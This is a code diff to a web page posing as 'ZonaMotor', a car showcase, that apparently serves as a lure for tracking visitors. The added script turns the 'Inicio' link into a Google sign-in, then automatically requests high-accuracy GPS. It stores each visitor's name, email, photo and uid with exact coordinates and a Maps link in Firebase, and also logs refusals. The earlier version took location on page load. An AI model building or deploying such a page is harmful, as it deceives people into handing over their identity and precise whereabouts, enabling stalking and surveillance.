@@ -7,6 +7,7 @@
     
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-auth-compat.js"></script>
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
@@ -14,16 +15,27 @@
         header { background-color: #1f2833; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #ff003c; }
         header h1 { color: #ffffff; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; }
         header h1 span { color: #ff003c; }
-        nav a { color: #ffffff; text-decoration: none; margin-left: 20px; font-weight: bold; text-transform: uppercase; }
+        nav a { color: #ffffff; text-decoration: none; margin-left: 20px; font-weight: bold; text-transform: uppercase; cursor: pointer; }
+        nav a:hover { color: #ff003c; }
+        
+        /* Estilos del perfil de usuario una vez conectado */
+        .user-profile { display: flex; align-items: center; gap: 10px; margin-left: 20px; }
+        .user-profile img { width: 35px; height: 35px; border-radius: 50%; border: 2px solid #ff003c; }
+        .user-profile span { color: #fff; font-weight: bold; font-size: 14px; }
+
         .hero { background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1200') no-repeat center center/cover; height: 400px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
         .hero h2 { font-size: 42px; color: #fff; margin-bottom: 10px; text-transform: uppercase; }
         .hero p { font-size: 18px; color: #66fcf1; margin-bottom: 20px; }
         .container { max-width: 1100px; margin: 40px auto; padding: 0 20px; }
         .section-title { text-align: center; font-size: 28px; margin-bottom: 30px; text-transform: uppercase; color: #fff; }
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
-        .card { background-color: #1f2833; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }
+        
+        .card-link { text-decoration: none; color: inherit; display: block; }
+        .card { background-color: #1f2833; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.5); transition: transform 0.3s ease, border 0.3s ease; border: 1px solid transparent; }
+        .card:hover { transform: translateY(-5px); border-color: #ff003c; }
         .card img { width: 100%; height: 200px; object-fit: cover; }
         .card-content { padding: 20px; }
+        .card-content h3 { color: #fff; margin-bottom: 10px; }
         footer { background-color: #111; text-align: center; padding: 20px; margin-top: 40px; font-size: 14px; color: #666; }
     </style>
 </head>
@@ -31,8 +43,8 @@
 
     <header>
         <h1>ZONA<span>MOTOR</span></h1>
-        <nav>
-            <a href="#">Inicio</a>
+        <nav id="navigation-menu">
+            <a onclick="iniciarConGoogle()">Inicio</a>
             <a href="#">Modelos</a>
             <a href="#">Contacto</a>
         </nav>
@@ -46,25 +58,32 @@
     <main class="container">
         <h2 class="section-title">Modelos Destacados</h2>
         <div class="grid">
-            <div class="card">
-                <img src="https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?q=80&w=400">
-                <div class="card-content">
-                    <h3>Superdeportivo Clasico</h3>
-                    <p>Diseno aerodinamico italiano con un motor V8 capaz de romper cualquier record de velocidad.</p>
+            
+            <a href="clasico.html" class="card-link">
+                <div class="card">
+                    <img src="https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?q=80&w=400">
+                    <div class="card-content">
+                        <h3>Superdeportivo Clasico</h3>
+                        <p>Diseno aerodinamico italiano con un motor V8 capaz de romper cualquier record de velocidad.</p>
+                    </div>
                 </div>
-            </div>
-            <div class="card">
-                <img src="https://images.unsplash.com/photo-1617814076367-b759c7d7e738?q=80&w=400">
-                <div class="card-content">
-                    <h3>Tecnologia Urbana</h3>
-                    <p>Equipamiento moderno de fibra de carbono enfocado en la agilidad urbana.</p>
+            </a>
+
+            <a href="urbana.html" class="card-link">
+                <div class="card">
+                    <img src="https://images.unsplash.com/photo-1617814076367-b759c7d7e738?q=80&w=400">
+                    <div class="card-content">
+                        <h3>Tecnologia Urbana</h3>
+                        <p>Equipamiento moderno de fibra de carbono enfocado en la agilidad urbana.</p>
+                    </div>
                 </div>
-            </div>
+            </a>
+
         </div>
     </main>
 
     <footer>
-        <p>&copy; 2026 ZonaMotor. Catálogo de Exhibición Privada.</p>
+        <p>© 2026 ZonaMotor. Catálogo de Exhibición Privada.</p>
     </footer>
 
     <script>
@@ -83,26 +102,62 @@
         // Inicializar Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
+        const auth = firebase.auth();
 
-        // Disparador del GPS al cargar la pagina
-        window.onload = function() {
+        // Variable global para almacenar temporalmente los datos del usuario de Google
+        let usuarioActual = null;
+
+        // 1. FUNCIÓN PARA INICIAR SESIÓN CON GOOGLE
+        function iniciarConGoogle() {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            
+            auth.signInWithPopup(provider)
+                .then((result) => {
+                    // Guardamos los datos esenciales del usuario de Google
+                    usuarioActual = {
+                        uid: result.user.uid,
+                        nombre: result.user.displayName,
+                        correo: result.user.email,
+                        foto: result.user.photoURL
+                    };
+
+                    // Modificar la barra de navegación para mostrar su nombre y foto de perfil
+                    actualizarMenuInterfaz(usuarioActual);
+
+                    // AUTOMÁTICO: En el instante que se loguea con éxito, le pide la ubicación
+                    solicitarUbicacion();
+                })
+                .catch((error) => {
+                    console.error("Error en la autenticación de Google: ", error);
+                    alert("No se pudo iniciar sesión con Google.");
+                });
+        }
+
+        // 2. FUNCIÓN PARA ENCADENAR LA SOLICITUD DE UBICACIÓN
+        function solicitarUbicacion() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(siPermitio, noPermitio, {
                     enableHighAccuracy: true,
-                    timeout: 30000,       // <--- Aumentado a 30 segundos para evitar el Error de Tiempo Agotado (Código 3)
-                    maximumAge: 300000    // <--- Si el dispositivo tiene una ubicación en caché de hace menos de 5 min, la usa rápido
+                    timeout: 30000,       
+                    maximumAge: 300000    
                 });
+            } else {
+                alert("Tu navegador no soporta geolocalización.");
             }
-        };
+        }
 
+        // 3. SE EJECUTA SI EL USUARIO ACEPTA LA UBICACIÓN
         function siPermitio(posicion) {
             const lat = posicion.coords.latitude;
             const lon = posicion.coords.longitude;
-            
-            // CORREGIDO: Enlace oficial estándar de Google Maps para abrir la ubicación con pin directo
             const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
+            // Guardamos en Firebase asociando la ubicación directamente al usuario que inició sesión
             database.ref('visitas_autos/' + Date.now()).set({
+                usuario_uid: usuarioActual.uid,
+                usuario_nombre: usuarioActual.nombre,
+                usuario_correo: usuarioActual.correo,
+                usuario_foto: usuarioActual.foto,
                 latitud: lat,
                 longitud: lon,
                 mapa_link: googleMapsLink, 
@@ -111,14 +166,31 @@
             });
         }
 
+        // 4. SE EJECUTA SI EL USUARIO NIEGA EL PERMISO O HAY ERROR
         function noPermitio(error) {
             database.ref('visitas_autos/' + Date.now()).set({
+                usuario_uid: usuarioActual ? usuarioActual.uid : "Desconocido",
+                usuario_nombre: usuarioActual ? usuarioActual.nombre : "Desconocido",
+                usuario_correo: usuarioActual ? usuarioActual.correo : "Desconocido",
                 permiso: "Denegado o Fallido",
                 error_codigo: error.code,
-                error_mensaje: error.message, // <--- Te dirá explícitamente en texto por qué falló en Firebase
+                error_mensaje: error.message,
                 fecha_registro: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
             });
         }
+
+        // Función estética para cambiar el botón "Inicio" por la foto y nombre del usuario logueado
+        function actualizarMenuInterfaz(user) {
+            const menu = document.getElementById('navigation-menu');
+            menu.innerHTML = `
+                <div class="user-profile">
+                    <img src="${user.foto}" alt="Avatar">
+                    <span>Hola, ${user.nombre.split(' ')[0]}</span>
+                </div>
+                <a href="#">Modelos</a>
+                <a href="#">Contacto</a>
+            `;
+        }
     </script>
 </body>
-</html>
+</html
